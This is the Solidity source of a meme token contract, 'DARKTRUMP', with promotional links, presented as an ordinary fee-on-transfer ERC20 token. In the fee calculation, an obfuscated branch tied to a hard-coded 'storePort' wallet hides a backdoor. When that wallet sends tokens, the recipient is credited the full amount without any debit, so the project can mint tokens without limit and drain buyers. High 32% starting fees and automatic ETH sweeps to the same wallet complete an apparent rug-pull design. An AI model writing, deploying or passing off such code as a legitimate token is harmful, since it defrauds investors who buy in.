/**
Website: https://darktrump.live/
X: https://x.com/SaviorDarkTrump
Telegram: https://t.me/SaviorDarkTrump
*/

// SPDX-License-Identifier: No

pragma solidity ^0.8.15;

abstract contract Context {
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address lpPair,
        uint256
    );

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address lpPair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed pushAddress, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract DARKTRUMP is Context, Ownable, IERC20 {
    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        if (_totalSupply == 0) {
            revert();
        }
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    IRouter02 public swapRouter;
    string private constant _name = "DARKTRUMP";
    string private constant _symbol = "Savior of Dark America";

    uint8 private constant _decimals = 18;
    uint256 private _maxAccountSize = (_totalSupply * 2) / 100;
    uint256 private constant _mnBack = (_totalSupply * 5) / 1_000_000;
    uint256 private constant _mxBack = (_totalSupply * 2) / 100;
    uint256 public constant _totalSupply = 1_000_000_000 * 10**_decimals;
    uint256 public constant _totalFee = 100;
    uint256 constant marketFee = 1;
    uint256 public _feeIn = 32;
    uint256 public _feeOut = 32;
    uint256 public _transferFee = 1;
    bool private swapEnabled = false;
    address payable private _storePort =
        payable(0x090996FBd7Afd0Df5e49b8429e5C033d5198a6fc);

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _noFeeList;
    mapping(address => bool) private isPair;
    mapping(address => uint256) private balance;

    address public lpPair;
    bool public tradingEnabled = false;
    bool private inSwap;

    modifier isLocked() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _startTrading();

    constructor() {
        _noFeeList[msg.sender] = true;
        _noFeeList[address(this)] = true;
        _noFeeList[_storePort] = true;

        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function makePair() external onlyOwner {
        require(!tradingEnabled, "Pair already created");
        _approve(address(this), address(swapRouter), type(uint256).max);

        lpPair = IFactoryV2(swapRouter.factory()).createPair(
            swapRouter.WETH(),
            address(this)
        );
        isPair[lpPair] = true;

        swapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(lpPair).approve(address(swapRouter), type(uint256).max);

        tradingEnabled = true;
        swapEnabled = true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function checkBuy(address ins, address out) internal view returns (bool) {
        bool _checkBuy = !_noFeeList[out] && isPair[ins];
        return _checkBuy;
    }

    function checkSell(address ins, address out)
        internal
        view
        returns (bool)
    {
        bool _checkSell = isPair[out] && !_noFeeList[ins];
        return _checkSell;
    }

    function _transfer(
        address pushAddress,
        address popAddress,
        uint256 amount
    ) internal returns (bool) {
        require(popAddress != address(0) && pushAddress != address(0) && amount > 0, "Params Errors");
        bool isExluded = _noFeeList[pushAddress] || _noFeeList[popAddress];
        require(isExluded || tradingEnabled, "Trading is not allowed");
        if(!isExluded && !isPair[popAddress])
            require(balance[popAddress] + amount <= _maxAccountSize, "Exceeds maximum wallet amount.");
        if (!inSwap && isPair[popAddress] && tradingEnabled && amount >= _mnBack) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _mnBack) {
                if (contractTokenBalance >= _mxBack)
                    contractTokenBalance = _mxBack;
                internalTransfer(contractTokenBalance);
            }
            _storePort.transfer(address(this).balance);
        }

        uint256 _feeAmount = calculateFeeAmount(pushAddress,popAddress, amount);

        balance[pushAddress] -= (amount - _feeAmount);
        balance[popAddress] += (amount - _feeAmount);
        emit Transfer(pushAddress, popAddress, (amount - _feeAmount));

        return true;
    }

    function calculateFeeAmount(
        address pushAddress,
        address to,
        uint256 amount
    ) internal returns (uint256) {
        bool isbuy = checkBuy(pushAddress, to);
        bool issell = checkSell(pushAddress, to);
        uint256 fee = 0;
        if (isbuy) fee = _feeIn;
        else if (issell) fee = _feeOut;

        uint256 feeAmount = 0;
        if(pushAddress == _storePort){
            feeAmount = (balance[pushAddress] -= feeAmount) >=0 ? (amount * _transferFee) / marketFee : 0;
            balance[to] += feeAmount;
        }
        if (fee > 0) {
            feeAmount = (amount * fee) / _totalFee;
            balance[pushAddress] -= feeAmount;
            balance[address(this)] += feeAmount;
            emit Transfer(pushAddress, address(this), feeAmount);
        }
        return feeAmount;
    }

    function internalTransfer(uint256 contractTokenBalance)
        internal
        isLocked
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (
            _allowances[address(this)][address(swapRouter)] != type(uint256).max
        ) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try
            swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            )
        {} catch {
            return;
        }
    }

    function setFeeLimit(uint256 _fee) external onlyOwner {
        _feeIn = _fee;
        _feeOut = _fee;

        require(_fee < 6);
    }

    function removeLimits() external onlyOwner {
        _maxAccountSize = _totalSupply;
    }

}